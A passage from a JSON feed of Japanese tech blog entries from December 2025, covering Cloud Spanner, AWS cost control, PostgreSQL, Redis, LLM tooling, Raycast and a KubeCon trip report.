紀子草思社Amazon","isoDate":"2025-12-17T03:17:05.000Z","dateMiliSeconds":1765941425000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"最近読んでいて興味深かった記事紹介 Vol.4","link":"https://zenn.dev/akasan/articles/interesting_tech_blog_4","contentSnippet":"今回で4回目の、最近読んで気になっている記事紹介になります！年末に向けて色々読んでいきたいので、最近見たものを紹介できればと思います！過去の記事は以下に載っていますので、ご興味ある方は是非ご覧ください。https://zenn.dev/akasan/scraps/97b063540d2372 Docker MCP Gateway:エージェントAIのためのオープンソースの安全なインフラストラクチャ私自身あまりMCPを利用できていないのが現状なのですが、dockerを利用してMCPをうまく運用するための方法をキャッチアップするために見ています！https://www.docker...","isoDate":"2025-12-16T13:14:53.000Z","dateMiliSeconds":1765890893000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"地球規模の「時間のずれ」を Cloud Spanner はどう解決したか","link":"https://sreake.com/blog/how-cloud-spanner-deal-with-large-scale-time-diff/","contentSnippet":"はじめに Sreake 事業部の芳賀雅樹 (@silasolla) です．普段はアプリケーションの開発支援を担当していますが，今回はその基盤となるデータベースの裏側の仕組みが気になり，深掘りしてみました． 早速ですが，G […]The post 地球規模の「時間のずれ」を Cloud Spanner はどう解決したか first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-12-16T01:25:00.000Z","dateMiliSeconds":1765848300000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cloud Spanner の記事を書きました (+ 技術的な蛇足)","link":"https://silasol.la/posts/2025-12-16-01_cloud-spanner/","contentSnippet":"Cloud Spanner のコアアーキテクチャについて，職場の Tech Blog 補足と技術的な余談 (Paxos, CAP 定理, NewSQL) をまとめました．","isoDate":"2025-12-16T00:00:00.000Z","dateMiliSeconds":1765843200000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"クラウド破産回避ガイド - AWSコスト管理の実践","link":"https://zenn.dev/r4ynode/articles/aws-cost-management","contentSnippet":"要約AWSのコスト管理は「Billing and Cost Management」の機能を知るところから「AWS Budgets」も良いけど、「AWS Cost Anomaly Detection」も一緒に使うといいよ原因調査は、、がんばろう、、、（頑張るTipsは紹介します） はじめにAWSを利用し、高額な請求が来てクラウド破産する方々を見かけます。きっとこれからもそのような経験をする方は絶えないでしょう。原因としてサービスの多さやクラウドの料金体系の複雑さが挙げられます。これを真に理解するには時間を要し面倒に思えますが、すべてを理解しなくても事前に対策することは容...","isoDate":"2025-12-15T22:00:06.000Z","dateMiliSeconds":1765836006000,"authorName":"Reito Koike","authorId":"reito"},{"title":"PostgreSQLのインデックス作成におけるパラメータの影響の調査","link":"https://zenn.dev/nnaka2992/articles/performance_measurement_on_pg_index_creation","contentSnippet":"このブログは3-shake Advent Calendar 2025 およびPostgreSQL Advent Calendar 2025のクロスポストです。PostgreSQLのインデックス作成のパフォーマンスには下記の2つのパラメータが特に大きく影響する。maintenance_work_memほとんどのインデックスメソッドにおいて、インデックス作成速度はmaintenance_work_memの設定に依存します。 より大きな値を設定すると、インデックス作成に必要となる時間が短縮されます。 ただし、実際に使用できるメモリ量を超えるほど大きくすると、マシンがスワップ...","isoDate":"2025-12-15T15:43:00.000Z","dateMiliSeconds":1765813380000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Langfuseに入門しないか？ ~ローカルホストで使ってみよう~","link":"https://zenn.dev/akasan/articles/langfuse_localhost","contentSnippet":"今回からLangfuseも取り扱っていこうと思います。Langfuseを利用することで、LLMの挙動をトレースすることができます。 Langfuseとは？Langfuseは、オープンソースのLLMエンジニアリングプラットフォームです。チームがLLMアプリケーションを共同でデバッグや分析、反復開発するのを支援してくれます。また、プラットフォームのすべての機能はネイティブに統合されており、開発ワークフローを加速します。Langfuseはオープンで、セルフホスト可能、そして拡張性に優れています。https://langfuse.com/docs主なインテグレーションについては以下にま...","isoDate":"2025-12-15T12:39:39.000Z","dateMiliSeconds":1765802379000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"初心で挑むredis入門 ~Redis lists編~","link":"https://zenn.dev/akasan/articles/redis_data_list","contentSnippet":"今回はredisで使えるlistsについてみていきます。先日公開したHashesについてもぜひご覧ください。https://zenn.dev/akasan/articles/redis_data_hash 早速検証redisの環境構築については先日公開した以下の記事を参考にしてください。https://zenn.dev/akasan/articles/redis_quickstartRedis listsのドキュメントは以下になります。https://redis.io/docs/latest/develop/data-types/lists/#performance ス...","isoDate":"2025-12-14T09:21:41.000Z","dateMiliSeconds":1765704101000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Raycast Community Japan 主催イベントに3連続参加した話","link":"https://zenn.dev/iorandd/articles/20251214-raycast-tokyo-ai-hackathon","contentSnippet":"本記事はRaycast Advent Calendar 2025の19日目の記事です。2025/10/23〜10/31にかけて Raycast Community Japan 主催のアイデアソン・ハッカソン・Meetup に参加しました。すでに2ヶ月近く経ってしまったのですが、備忘録としてアイデアソンでのブレストから実際に Raycast Extension を作るまでの流れ、Meetup でのコミュニティとの交流を振り返ろうと思います。 1. 参加前年初に転職してセットアップを始めた PC にクリップボード系のアプリを入れようと思っていたところ、Raycast がアツくて他の...","isoDate":"2025-12-13T15:00:00.000Z","dateMiliSeconds":1765638000000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Raycast Extension 開発のすすめ","link":"https://zenn.dev/iorandd/articles/20251215_start-raycast-extension-dev","contentSnippet":"本記事は 3-shake Advent Calendar 2025 14日目の記事です。Raycast Advent Calendar 2025 でも2025年10月下旬に行われたRaycast Community Japan 主催イベントに3連続で参加した話を書きます。Raycast Extension開発やコミュニティに興味を持ったきっかけとなったイベントなので、よければ読んでください。この記事ではRaycast Extension をローカルで作ってStoreに出すまでの手順を解説します。 1. Extensionを作るべき理由 RaycastとはRaycast は...","isoDate":"2025-12-13T15:00:00.000Z","dateMiliSeconds":1765638000000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"デタッチドマウントとコンテナランタイム","link":"https://qiita.com/ys1/items/eac9727ec1d4e71a3cd7","contentSnippet":"はじめにこの記事はQiita 3-shake Advent Calendar 2025 シリーズ13日目の記事です。最近、低レベルコンテナランタイムである youki にコントリビュートしており、特にデタッチドマウントについて調べる機会があったので、その内容を共有しま...","isoDate":"2025-12-13T11:58:19.000Z","dateMiliSeconds":1765627099000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"NVIDIA 認定資格奮闘記 ~Professional Agentic AI編~","link":"https://zenn.dev/akasan/articles/nvidia_pro_agentic_ai","contentSnippet":"今回はNVIDIAの認定資格であるProfessional Agentic AIを取得したので、その内容を共有しようと思います。 Professional Agentic AIとは？Professional Agentic AI（以下、NCP-AAI）は、マルチエージェントインタラクションや分散推論、スケーラビリティ、倫理的セーフガードに重点を置き、高度なエージェントAIソリューションを設計、開発、展開、管理する能力を試される試験です。エージェント開発だけなくそのサービングやモニタリングなど、DevOpsやMLOpsに関わるような内容が網羅的に出されるのが特徴です。https:/...","isoDate":"2025-12-13T05:21:28.000Z","dateMiliSeconds":1765603288000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"短編：ブログネタってどうやって探してる？お答えします","link":"https://zenn.dev/akasan/articles/blog_neta_howto","contentSnippet":"今回は短編です。のべ240日程度連日テックブログを書いている私ですが、どのようにネタを探しているのかを共有しようと思います。 そもそも何で毎日ブログ書いてるの？詳細は以下の記事にて共有していますが、今改めて毎日書いているモチベをまとめると以下になります。自分の技術に対する興味をせっかくなら発信したいそもそも三日坊主だったので、ちゃんと習慣化できるようになりたかった今更引けないw単純に楽しいhttps://zenn.dev/akasan/articles/4aba4d3a0616ce ネタの探し方私のブログではいくつかの要因によってネタが決まっています。選び方の順...","isoDate":"2025-12-12T14:01:24.000Z","dateMiliSeconds":1765548084000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Google Cloud Workstations入門: 安全かつ再現可能な開発環境の作り方","link":"https://qiita.com/aminevg/items/b953ae647c81eef59e95","contentSnippet":"この記事は 3-shake Advent Calendar 2025 (12 日目) の投稿です。こんにちは！ スリーシェイクのイリドリシ愛民 (@realaminevg) です。最近は主にクライアントワークを行なっているため、セキュリティやオンボーディングを徹底する必...","isoDate":"2025-12-11T22:08:14.000Z","dateMiliSeconds":1765490894000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"NVIDIA NeMo Agent Toolkitを使ってみた","link":"https://sreake.com/blog/how-to-use-nvidia-nemo-agent-toolkit/","contentSnippet":"概要 こんにちは佐藤慧太@SatohJohnです。 NVIDIA NeMo Agent Toolkit（以下、この記事ではNATと呼ぶことにします）は生成AIに関する様々なツール・フレームワーク・言語モデルを組み合わせて […]The post NVIDIA NeMo Agent Toolkitを使ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-12-11T13:35:36.000Z","dateMiliSeconds":1765460136000,"authorName":"Sreake","authorId":"Sreake"},{"title":"登壇記録：NVIDIA NIMとNVIDAI NeMo Guardrailsの紹介","link":"https://zenn.dev/akasan/articles/nvidia_nim_nemo_toudann","contentSnippet":"今回は本日以下のイベントで登壇しましたので、そちらの資料の共有と簡単な概要の共有になります。https://3-shake.connpass.com/event/373638/ 登壇資料の共有今回の登壇資料は以下のspeackerdeckにアップロードしておりますのでぜひご覧ください。 登壇内容今回の登壇では主に以下のトピックについて取り扱いました。NVIDIA NIMを用いた最適化された環境でのモデルのサービングについてgarakを用いたLLMの脆弱性診断NeMo Guardrailsを用いたLLMに対するガードレールの設定LLMをアプリケーションを組み込む...","isoDate":"2025-12-11T13:28:09.000Z","dateMiliSeconds":1765459689000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"世界のランダムなドメインへユーザーを飛ばすサイトを作った","link":"https://qiita.com/RiiiM/items/d211f2a78d5607b38c1d","contentSnippet":"Qiita クソアプリ Advent Calendar 2025の 12/11 作品です。","isoDate":"2025-12-11T00:00:00.000Z","dateMiliSeconds":1765411200000,"authorName":"riiim","authorId":"riiim"},{"title":"とあるMLエンジニアの年末年始の予定の呟き","link":"https://zenn.dev/akasan/articles/2025_new_years_eve","contentSnippet":"今回はMLエンジニアとしてひたすら精進を頑張っている私が今年の年末年始どのように過ごす予定か、誰得ではありますしこんなことをzennに書いている人がいるかわからないですが、まとめてみます。 まずはこのアドベントカレンダーについて2025/04/18に爆誕してすでに230日を超えていますが、まずは2025/12/25までは毎日投稿を続ける予定です！その後についてですが、年末年始は流石にちょっとお休みしようかなと思っており、2025/12/26から2026/1/4はお休みしようと思っています。もちろん、途中で急に書きたいことがあれば発信しますが、謎の義務感・使命感によって続けられている...","isoDate":"2025-12-10T13:25:20.000Z","dateMiliSeconds":1765373120000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"rustで非同期ランタイム実装してみた","link":"https://zenn.dev/sraku/articles/2e50371363cbaa","contentSnippet":"はじめにこの記事はQiita 3-shake Advent Calendar 2025 シリーズ10日目の記事です。以前Rustのイベントに参加した時に非同期周りの話がでて、少し興味が湧いたので実装してみたというお話になります。リポジトリはこちらですhttps://github.com/sraku2159/async_runtimeはじめにRustにおける非同期処理の特徴を概説します。 Rustの非同期処理の特徴Rustはいわゆる協調的マルチタスクと呼ばれる機構によって非同期処理を実現しています。つまり、シグナルなどによってプリエンプトされるのではなく、async関...","isoDate":"2025-12-09T15:00:05.000Z","dateMiliSeconds":1765292405000,"authorName":"Sota Nakano","authorId":"sraku"},{"title":"最近読んでいて興味深かった記事紹介 Vol.3","link":"https://zenn.dev/akasan/articles/interesting_tech_blogs_3","contentSnippet":"今回は読んでいて良かった記事を紹介するシリーズの第3弾になります。過去のシリーズは以下にまとめていますのでぜひご覧ください。https://zenn.dev/akasan/scraps/97b063540d2372 Open Source for DevelopersこちらはNVIDIAのエンジニアの方がコントリビュートしているOSSのリストが載っています。世界最高峰レベルのエンジニアがどのようなOSSに関わっておられるのか興味がありみていました。https://developer.nvidia.com/open-source?sortBy=open_source_projec...","isoDate":"2025-12-09T13:02:46.000Z","dateMiliSeconds":1765285366000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"地方リモートエンジニア歴3年、やってよかった7つのこと","link":"https://zenn.dev/yuu0w0yuu/articles/f44cceadef5a53","contentSnippet":"この記事は、3-shake Advent Calendar 2025の11日目の記事です。おぼろげながら浮かんできたんです。7という数字が。 朝のラジオ体操私が住んでいる長野県の松本市は、晴天率が全国的に見ても高く、一年を通して晴れていることが多いです。ある朝、「こんな爽やかな朝、何かせねば」と思って始めたのがラジオ体操でした。第一だけなら約3分ほど。ほどよい負荷で爽やかな朝を迎えることができます。旅行先でも必ずやります。漫然とやるのではなく、お手本動画のように綺麗なフォームを意識することが重要です。肩周り・腰回りをブンブン回すので、デスクワークで姿勢が歪みがちなあなた、特...","isoDate":"2025-12-09T07:23:08.000Z","dateMiliSeconds":1765264988000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"AIに手順書を書かせよう! 手順書作成で向き合うAIの不確実性","link":"https://zenn.dev/kamos/articles/procedure_book_with_ai","contentSnippet":"はじめにAIに手順書を書かせてみよう! 手順書にはいくつか必要なポイントがあるね!明確な作業目的作業内容の確実性手順の網羅性影響範囲AIはここに書かれていること、結構苦手だよね。特に作業内容の確実性を担保することは苦手なんだよね!だから、AIに手順書を書かせるときは、AIが苦手なポイントを補うように工夫する必要があるよ!今回は、AIに｢災害時検証: CloudSQLリージョン移行｣の手順書を書かせてみて、一緒に工夫してみよう! 手順作成 まずはそのまままずは、AIにそのまま手順書を書かせてみよう! 以下のプロンプトを使用してみたよ!Cloud SQLの...","isoDate":"2025-12-08T15:23:49.000Z","dateMiliSeconds":1765207429000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"メモリ安全なC言語実装「Fil-C」について紹介","link":"https://dev.mix64.com/2025/12/08/post-397/","contentSnippet":"今回はメモリ安全なC言語実装を提供できる「Fil-C」について紹介します。既存のC言語プログラムに対しても互換性を持ち、再コンパイルすること...","isoDate":"2025-12-08T13:03:10.000Z","dateMiliSeconds":1765198990000,"authorName":"ayibote","authorId":"ayibote"},{"title":"初心で挑むredis入門 ~Redis hashes編~","link":"https://zenn.dev/akasan/articles/redis_data_hash","contentSnippet":"今回はredisで使えるhashesについてみていきます。昨日公開したStringsについてもぜひご覧ください。https://zenn.dev/akasan/articles/redis_datatypes 早速検証！！redisの環境構築については先日公開した以下の記事を参考にしてください。https://zenn.dev/akasan/articles/redis_quickstartRedis hashesのドキュメントは以下になります。https://redis.io/docs/latest/develop/data-types/hashes/ hashesに...","isoDate":"2025-12-08T12:19:17.000Z","dateMiliSeconds":1765196357000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"【初参加】CODE BLUE 2025レポート：体感したトレンドとAIの脅威","link":"https://qiita.com/yutaf11/items/239101da0bf5265b61df","contentSnippet":"はじめに先月、CODE BLUE 2025に参加してきました。私は普段、SRE兼セキュリティエンジニアとして働いています。過去、SREとして技術系のイベントにはいくつか参加してきましたが、セキュリティ特化のオフラインイベントは今回のCODE BLUEが初めてでした。こ...","isoDate":"2025-12-08T08:35:39.000Z","dateMiliSeconds":1765182939000,"authorName":"Yuta Fujii","authorId":"yutaf11"},{"title":"2025年AWS Community Builderの活動報告","link":"https://blog.masasuzu.net/entry/2025/12/08/100000","contentSnippet":"今年はブログ4本(純粋なAWSの記事はなし)、登壇5本(内社内2本)という結果でした。勉強会参加自体はそこそこしてたんですが、アウトプットという点では少し物足りない結果になったなという感想です。要因としてはGoogle Cloud関連の活動が比較的多くて、AWS関連にリソースを割けなかったというのもあります。第二の理由としては今年後半が特に業務が多忙で身動きが取れない月があったのも事実です。とはいえ忙しいは言い訳に過ぎないので、なんとアウトプットする仕組み作りをしていきたいとことです。来年はもっとアウトプットを増やしていきたいです。そこで以下の数値を目標にやっていきたいと考えています。社外登壇: 月0.5本AWSテーマのブログ: 月1本以上やってくぞ。以下今年のアウトプットを置いておきます。ブログAWS関連なしクラウドニュートラルblog.masasuzu.netdiary.masasuzu.netdiary.masasuzu.netblog.masasuzu.net登壇AWS関連 speakerdeck.com speakerdeck.com speakerdeck.comクラウドニュートラル speakerdeck.com speakerdeck.com","isoDate":"2025-12-08T01:00:00.000Z","dateMiliSeconds":1765155600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AI時代のスキーマファースト開発 FastAPI \xd7 GitHub Packages で型安全なSDKを自動配布する","link":"https://zenn.dev/meziron/articles/32ac2241bbec38","contentSnippet":"はじめにこの記事は 3-shake Advent Calendar 2025 の記事です。フロントエンド開発者とバックエンド開発者の間で「APIの仕様が違う」「ドキュメントが古い」といった問題に悩まされたことはありませんか？さらにAI時代になり、Claude CodeやCursorなどのAIコーディングツールを使う機会が増えてきました。しかし、AIにAPI呼び出しを実装させると、存在しないエンドポイントを「想像」で実装してしまったり、パラメータの型を間違えたりすることがあります。本記事では、FastAPIのOpenAPI自動生成機能を活用し、GitHub ActionsでTy...","isoDate":"2025-12-07T15:00:49.000Z","dateMiliSeconds":1765119649000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"どこでも動くC言語プログラム「Cosmopolitan Libc」を触ってみた","link":"https://dev.mix64.com/2025/12/07/cosmopolitan-libc/","contentSnippet":"今回はC言語でありながらbuild-anyware run-anywareを目指すプロジェクト「Cosmopolitan Libc」について...","isoDate":"2025-12-07T09:16:04.000Z","dateMiliSeconds":1765098964000,"authorName":"ayibote","authorId":"ayibote"},{"title":"初心で挑むredis入門 ~Redis Strings編~","link":"https://zenn.dev/akasan/articles/redis_datatypes","contentSnippet":"今回はredisで使えるStringsについてみていきます。 早速検証！！redisの環境構築については先日公開した以下の記事を参考にしてください。https://zenn.dev/akasan/articles/redis_quickstartRedis Stringsのドキュメントは以下になります。https://redis.io/docs/latest/develop/data-types/strings/ 単独の値の格納redisでは文字列やシリアライズされたデータをbytesデータとして格納します。早速keyとvalueを指定して文字列を格納してみましょう。...","isoDate":"2025-12-07T03:46:51.000Z","dateMiliSeconds":1765079211000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"初心で挑むredis入門 ~サーバ起動とPythonからのアクセス~","link":"https://zenn.dev/akasan/articles/redis_quickstart","contentSnippet":"今回は改めてredisに入門してみました。今まで使って経験はありつつ、ちゃんと調べて勉強しようということで使ってみました。まずはサーバの建て方とPythonからのアクセス方法をまとめてみます。 検証内容今回は以下の内容を実施しますredisサーバの起動Docker上でサーバを立てますポートは6379でポートフォワーディングによりローカル環境からアクセスできるようにしますpythonコードからのアクセスシンプルなデータの格納と取得を実施 早速検証！！ redisサーバの起動redisサーバをDocker上で立てます。以下のレポジトリを参考にたてます...","isoDate":"2025-12-06T13:56:14.000Z","dateMiliSeconds":1765029374000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"AlloyDB と Cloud Spanner (スケーラビリティの境界)","link":"https://silasol.la/posts/2025-12-05-01_alloy-db-and-spanner/","contentSnippet":"AlloyDB と Cloud Spanner のアーキテクチャの違いやスケーラビリティの境界について解説します．","isoDate":"2025-12-05T00:00:00.000Z","dateMiliSeconds":1764892800000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"おい、テックブログを書け","link":"https://speakerdeck.com/nwiizo/oi-tetukuburoguwoshu-ke","contentSnippet":"2025年12月5日に「おい、テックブログを書け」という登壇をした。\\r\\r「おい」である。命令形である。30分間、人前に立って「書け」と言い続けるという、冷静に考えるとなかなか傲慢な振る舞いをしてきたわけだが、登壇資料を作っている最中、ふと気づいてしまった。書けと言っている自分は、なぜ書いているのだろうか、と。\\r\\r技術ブログを書くことについて語ろうとすると、それは私が「書いてきた」ことを晒すことに他ならず、AIとの付き合い方を語ろうとすると、それは私が「どう仕事をしているか」を開陳することと紙一重になる。そうなると聞いている側からすれば、こいつは結局、自分の話がしたいだけなのではないか、登壇という大義名分を得て気持ちよく自分語りをしているだけなのではないか、と思われても仕方がない。いや、実際そうなのかもしれない。そう見られることへの嫌悪感と、そう見られまいと振る舞う自分への嫌悪感が同時に存在していて、どちらに転んでも結局イヤなやつなのである。\\r\\rしかし登壇というのは厄介なもので、「書け」と命令するからには、自分がなぜ書いてきたのかを明かさなければ説得力がない。説得力のない登壇ほど空虚なものはない。空虚な登壇をする自分を想像して、それはそれで耐えられない。結局、自己開示から逃げられない構造になっている。なんという罠だろうか。\\r\\r身体性という言葉を使った。AIに記事を書かせることについて話した。私の答えは明確で、記事はほとんどAIに書かせている、しかし価値の源泉は私にある、と。私が素材を提供し、AIが構造化し、私がレビューして調整する。編集者としてのAI。この協働こそが現代の執筆だと、そう話した。話しながら、これは本当にそうだろうかと自分を疑う自分がいて、でもそういう迷いごと引き受けて喋るしかないのだった。\\r\\rまず自分のために書け、結果として、それが誰かを救う。そう締めくくった。\\r\\rhttps://forkwell.connpass.com/event/377267/\\r\\rhttps://syu-m-5151.hatenablog.com/archive/category/%E3%81%8A%E3%81%84%E3%80%81\\r\\r自宅からの昼登壇だったので、終わってから昼飯を食べに外に出た。参考書籍として紹介した本をもう一度読み返そうと思って、鞄に入れてきていた。店に向かう道すがら、本を開く。","isoDate":"2025-12-04T05:00:00.000Z","dateMiliSeconds":1764824400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Electronアプリで型安全なIPC通信を実現する electron-trpcという選択肢","link":"https://zenn.dev/meziron/articles/82dfa259c30bf8","contentSnippet":"はじめにこの記事は 3-shake Advent Calendar 2025 の記事です。Electronアプリケーションの開発において、Main ProcessとRenderer Process間の通信（IPC）を型安全に実装することは、開発体験と保守性を高める上で重要な課題です。本記事では、electron-trpcを用いて、IPC通信の型安全性を効率的に確保する方法について解説します。 従来の課題：型定義の分散とボイラープレートElectron標準のIPC通信（ipcMain / ipcRenderer）を使用する場合、型安全性を確保しようとすると、記述量が増大しが...","isoDate":"2025-12-03T15:00:03.000Z","dateMiliSeconds":1764774003000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"ECSのService ConnectとService Discoveryの違いを理解する","link":"https://zenn.dev/iorandd/articles/20251204_aws-ecs-beginner","contentSnippet":"本記事は若手AWS Leading Engineerを志す者達 Advent Calendar 2025の4日目の記事です。AWS Jr. Champions 2026 を目指すアドカレということで、業務でAmazon Elastic Container Service (ECS) を使ったマイクロサービス環境に触れる中で、Service Connect と Service Discoveryの違いを理解するために調べたことをまとめました。普段はスリーシェイクという会社でフルスタックエンジニアとしてWebアプリケーション開発に従事しています。会社の方でも3-shake Advent ...","isoDate":"2025-12-03T15:00:01.000Z","dateMiliSeconds":1764774001000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"1Password の SSH Agent を WSL でも使う","link":"https://qiita.com/yteraoka/items/a056f7c055cc73b06d19","contentSnippet":"パスワード系は 1Password に登録しているのですが SSH の鍵はなんとなく面倒でファイルでローカルに置いたままでした。しかし、バックアップを取るのも面倒だし 1Password で管理しようかなという気になりました。せっかくお金も払っているのだし使えるものは使おう...","isoDate":"2025-12-01T15:07:22.000Z","dateMiliSeconds":1764601642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"初めての海外カンファレンス(KubeCon NA 2024 in Salt Lake City)","link":"https://blog.masasuzu.net/entry/2025/12/01/212119","contentSnippet":"この記事は3-shake Advent Calendar 2025です。qiita.com吉祥寺.pm #37で話した内容となります。kichijojipm.connpass.com speakerdeck.com厳密には10年以上前に行ったことあるんですが、完全に忘れているので実質今回が初回ということでお願いします。今回は業務として、KubeCon NAへ行かせてもらったのでその体験を共有いたします。セッション内容については触れません。旅程的には11/11-17となっており、KubeCon NAの開催期間としては11/12-15となっています。以下の目次で送らせていただきます。出国準備5ヶ月前1か月前前日まで随時往路現地復路事後まとめ出国準備やったことは以下のとおりです。5か月前KubeConチケット手配ホテル予約飛行機手配1ヶ月前パスポート取得ESTA申請Visit Japan登録前日まで荷物準備随時英語技術インプット5ヶ月前KubeCon自体のチケット手配はまとめて会社の方でやっていただきました。ホテルと飛行機はKubeCon割引があったのでこれを利用しました。飛行機はUnited航空の乗継便を予約しました。行きは成田=>ダラス=>ソルトレイクシティー、帰りはソルトレイクシティー=>ロサンゼルス=>成田を予約していました。飛行機が往復で26万円、ホテルが12万円でした。なかなかな値段ですね。同僚と1日違いでチケットを買ったら微妙に値段が変わっていた記憶があります。早めの行動大事ですね。ホテルも飛行機も日本語サイトがあったので特に困った記憶がないです。1か月前数年前にパスポートの期限が切れていたので、これを機に再発行しました。東京都庁地下にパスポートセンターがあるので、ここで申請しました。パスポートセンター横に写真屋さんがあるので、証明写真を準備せずに行っても安心です。だいたい1週間で発行されるので、また1週間後に赴くことになります。渡米する際にESTAを申請する必要があります。ここで注意してほしいのは、検索トップやスポンサーサイトとして出てくるサイトはそれっぽい偽物なので騙されないように注意してください。esta.cbp.dhs.govVisit Japanを事前に登録していくことで日本への帰国時にスムーズになりますのでやっておくことをおすすめします。services.digital.go.jp前日までここまででだいたいやらないといけないことは終わってるので、あとは荷造りです。大きな荷物としては手荷物で入る大きさのトランクケースとビジネスリュックサックの2つを持っていきました。それにプラスしてパスポートと財布と携帯を常に携帯するためのサコッシュも持ち込みました。4泊5日暮らせる最低限の服だけ持ち込みました。だいぶコンパクトになったと思います。基本的に外で食べるつもりはあまりなかったので、全日程の夕食を持ち込みました。オートミール、フリーズドライの味噌汁、粉末スープ類、ルイボスティーなど持っていきました。スープ類にオートミールを入れてレンジで温めればなんとかなります。ここで注意しないといけないのはアメリカは動物性成分が含まれているものは持ち込めません。魚介はOKなのでそのあたり注意しましょう。このへんは国によって違います。電子機器に関しては120V対応しているものはそのままアメリカでも使えます。コンセントの形状は日本と同じですがボルト数が違う形になります。先に言ったようにパスポート、財布、携帯はサコッシュに入れて肌身離さないようにしていました。随時英語はほんとにもっとやっておけばよかったなと思いました。Duolingoはずっとやっていましたが、リスニング、スピーキングという観点からは足りないですね。最近だとスピークバディみたいなAI英会話アプリがあるのでそのあたりもっとやり込んでおけばよかったなと後悔してます。あとやったこととしては、CNCFのyoutubeチャネルに大量の過去のKubeConアーカイブがあるのでそれでひたすら耳をならしてました。www.youtube.com往路実を言うとですね。出国する当日朝まで沖縄にいました。出国当日はこんな感じでした。11/7 午前 羽田着11/7 昼 家で荷物最終チェック11/7 夕方成田出発沖縄から帰る飛行機がちゃんと飛んで良かったと心から思います。普通はこんなことしないです。いろいろ重なって仕方なかったのでした。ということで、行きは成田発、デンバー乗り継ぎ、ソルトレイクシティーという行程です。。。。。でした。デンバー行きの飛行機に乗っていて途中で行き先がアンカレッジ(アラスカ州)に変わってることに気が付きます。急病人救護のためにアンカレッジに緊急着陸することになりました。なんやかんやあって無事デンバーには到着するのですが、当然乗継便には間に合わずなので振り返る必要がありました。自分はアンカレッジ出発時点までにかすかな電波を頼りにスマートフォンから振替を行ったのですが、同僚たちは電波がなく何もできなかったので、自動的に翌日の便に振り返られてしまいました。ちょっとそれは困るのですが、この時点ではどうにもならないのでいったんデンバーに到着し入国審査を受けることになりました。正直入国審査はかなり厳しくされるのかなと不安になっていたのですが、案外すんなり通って拍子抜けしました。デンバーの空港にてなんとか本日便で乗り継げないか交渉することになりました。どうやら現状満席の便でもウェイティングリストに入ることでキャンセル待ちに並ぶことができてうまくいけば本日便で行けそうだということがわかりました。Uniteの係員の人がウェイティングリスト登録のためにコマンドプロンプトを駆使してたのが印象的でした。コマンド操作でやるんですねと感心しました。ともあれ、初っ端からトラブルに見舞われましたが拙い英語でもなんとか乗り切ることができました。なんやかんやあって、ソルトレイクシティーまでたどり着くことができました。現地空港からホテルまではLRTで移動しました。TransitというアプリでOne-Wayチケットを購入して乗るみたいでした。チケットをActivateして乗るのですが、QRコード自体はあるのですが、最後まで誰にも見せることなく下車しました。これが信用乗車方式か。。。となりました。会場はめっちゃ広いし、めっちゃ人が多くて、これが本場か、、、と圧倒されました。飲み物はいたるところにありました。コーヒーに困ることはありませんでした。ランチボックスが無料配布されてることに4日目に気が付きました。それまで、毎回ホテルに帰ってオートミールを食べる生活をしていました。毎回ランチに必ずお菓子が含まれているのはアメリカンな文化なのでしょうか。ランチはビーフ、チキン、ベジタリアン、ビーガン、グルテンフリーから選べました。なんというか文化を感じますね。英語に自身なかったので、文字起こしと翻訳をしてくれるSaaSアプリを試してたのですが、いまいち制度が低くてあまり役に立たなかったでした。これもあとから気づいたのですが、ルームごとにQRが貼ってあって、そこにアクセスすると文字起こしと翻訳をしてくれるアプリケーションが用意されていました。今回いたるところで自分の情報弱者ぶりを感じてしまいました。KubeConのセッション自体はYoutubeにすぐ上がるので、その場で頑張りすぎずにあとで復習するのがよいです。ただ、現地でしか体験できない雰囲気を味わえたことはすごく良い経験になりました。現地での日本人交流会ではバリバリKubernetesをつかっている人たちの生の声が聞けて刺激になりました。復路特筆すべきことはないですVisit Japanをあらかじめ登録しておいたので、入国審査と税関はすんなりと通過できました。事後経費採算しっかししましょう。経費採算終わるまでが出張ですまとめ往路がこすぎてソルトレイクシティーについた瞬間もう帰っていいかなという気持ちになりました。トラブルはありつつも一つ一つこなしていけばまあなんとかなるものだなと思いました。英語はほんとにちゃんとやっておきたかったなと言う気持ちが強いです。もっとできてれはもっと実りが多かったなと。当たり前の話ですが、羽田、成田の乗り継ぎはやめたほうが望ましいです。社会人は余裕持った行動をしましょう(?)いろいろもっとうまくやりたかったという気持ちはありつつも本場のでっかいカンファレンスに参加して色んな意味で刺激を受けました。また英語もそうですし、知識レベルを上げて海外カンファレンス再挑戦したいです。来年はre:Invent行たいです!さて、真面目なまとめは同僚が書いてるのでこちらを参照してください。sreake.comそれでは。","isoDate":"2025-12-01T12:21:19.000Z","dateMiliSeconds":1764591679000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GitHub 